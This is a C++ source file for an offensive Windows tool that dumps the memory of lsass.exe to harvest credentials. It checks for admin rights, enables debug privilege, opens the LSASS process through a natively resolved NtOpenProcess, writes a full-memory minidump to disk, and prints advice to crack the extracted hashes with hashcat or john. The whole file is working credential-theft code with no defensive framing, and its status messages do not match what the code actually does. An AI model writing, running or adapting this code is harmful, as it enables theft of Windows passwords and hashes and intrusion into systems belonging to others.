#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <ntstatus.h>
#include <chrono>
#include <thread>
#include <tchar.h>
#include "ntapi.h"

#pragma comment(lib, "Dbghelp.lib")

using namespace std;

typedef NTSTATUS(NTAPI* _NtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI* _NtClose)(HANDLE);

_NtOpenProcess NtOpenProcess;
_NtClose NtClose;

bool LoadNtApi() {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == nullptr) {
        cerr << "[!] Failed to get handle of ntdll.dll" << endl;
        return false;
    }

    NtOpenProcess = (_NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    if (NtOpenProcess == nullptr) {
        cerr << "[!] Failed to get address of NtOpenProcess" << endl;
        return false;
    }

    NtClose = (_NtClose)GetProcAddress(hNtdll, "NtClose");
    if (NtClose == nullptr) {
        cerr << "[!] Failed to get address of NtClose" << endl;
        return false;
    }

    return true;
}

bool isElevated() {
    TOKEN_ELEVATION te;
    HANDLE hToken;
    BOOL ret = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD cbsize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &cbsize)) {
            ret = te.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return ret;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        cerr << "[!] Failed to open Process Token" << endl;
        cerr << "[!] Error: " << GetLastError() << endl;
        return false;
    }

    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        cerr << "[!] Failed to Look for Debug Privilege" << endl;
        cerr << "[!] Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        cerr << "[!] Failed to adjust privilege to token" << endl;
        cerr << "[!] Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

DWORD GetPID(LPCTSTR processname) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        cerr << "[!] Error in Process Snapshot" << endl;
        cerr << "[!] Error: " << GetLastError() << endl;
        return 0;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapShot, &pe)) {
        do {
            if (_tcsicmp(processname, pe.szExeFile) == 0) {
                DWORD pid = pe.th32ProcessID;
                CloseHandle(hSnapShot);
                return pid;
            }
        } while (Process32Next(hSnapShot, &pe));
    }

    CloseHandle(hSnapShot);
    return 0;
}

int main(int argc, char* argv[]) {
    HANDLE hLsass = NULL;
    HANDLE hFile;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING processName;
    CLIENT_ID clientId;
    DWORD pid;
    BOOL result;
    LPCTSTR processname = L"lsass.exe";

    if (!LoadNtApi()) {
        cerr << "\t\t[!] Failed to load NT API functions" << endl;
        return 1;
    }

    if (!isElevated()) {
        cerr << "\t\t[!] Please run this tool with admin privileges" << endl;
        return 1;
    }
    if (!EnableDebugPrivilege()) {
        cerr << "\t\t[!] Failed to enable debug privileges" << endl;
        return 1;
    }

    pid = GetPID(processname);

    if (pid == 0) {
        cerr << "\t\t[!] Invalid Process Try Again" << endl;
        return 1;
    }

    RtlInitUnicodeString(&processName, processname);
    InitializeObjectAttributes(&objAttr, &processName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    clientId.UniqueProcess = ULongToHandle(pid);
    clientId.UniqueThread = NULL;

    status = NtOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);
    if (status != STATUS_SUCCESS) {
        cerr << "\t\t[!] Failed to open Process with Native API" << endl;
        return 1;
    }

    TCHAR szFileName[MAX_PATH];
    _stprintf_s(szFileName, MAX_PATH, _T("Raulisr00t.file"));

    hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "\t\t[!] Unable to create file" << endl;
        NtClose(hLsass);
        return 1;
    }

    MINIDUMP_EXCEPTION_INFORMATION dumpExInfo;
    dumpExInfo.ThreadId = GetCurrentThreadId();
    dumpExInfo.ExceptionPointers = NULL;
    dumpExInfo.ClientPointers = FALSE;

    result = MiniDumpWriteDump(hLsass, pid, hFile, MiniDumpWithFullMemory, &dumpExInfo, NULL, NULL);
    if (!result) {
        cerr << "\t\t[!] Failed to Dump Process Memory" << endl;
    }
    else {
        cout << "\t\t[!] Process memory dumped successfully" << endl;
    }

    NtClose(hLsass);
    CloseHandle(hFile);

    cout << "[+]Great running with admin privileges................" << endl;
    cout << "[+]EnableDebugPrivileges................" << endl;
    cout << "[+]obtain handle from lsass.exe via ZwOpenProcess().)" << endl;
    cout << "[+]Dump lsass.exe using MiniDumpWriteDump()......." << endl;
    cout << "[+]Dumping file with only the streams needed to be parsed (SystemInfo, ModuleList and Memory64List Streams)." << endl;
    cout << "[+]Enjoy the D3MPSEC.file and use hashcat or jtr to dump hashes.)" << endl;

    return 0;
}
